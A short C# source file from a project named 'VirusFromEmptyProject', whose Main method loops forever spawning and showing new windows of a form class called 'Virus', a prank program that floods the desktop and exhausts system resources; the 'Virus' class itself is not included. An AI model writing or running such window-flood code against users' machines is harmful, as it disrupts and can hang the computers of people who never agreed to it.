using System.Windows.Forms;

namespace VirusFromEmptyProject
{
    class Project
    {
        public static void Main()
        {       
            while (true)
            {
                Form f = new Virus();
                f.Show();
            }
        }
    }
}
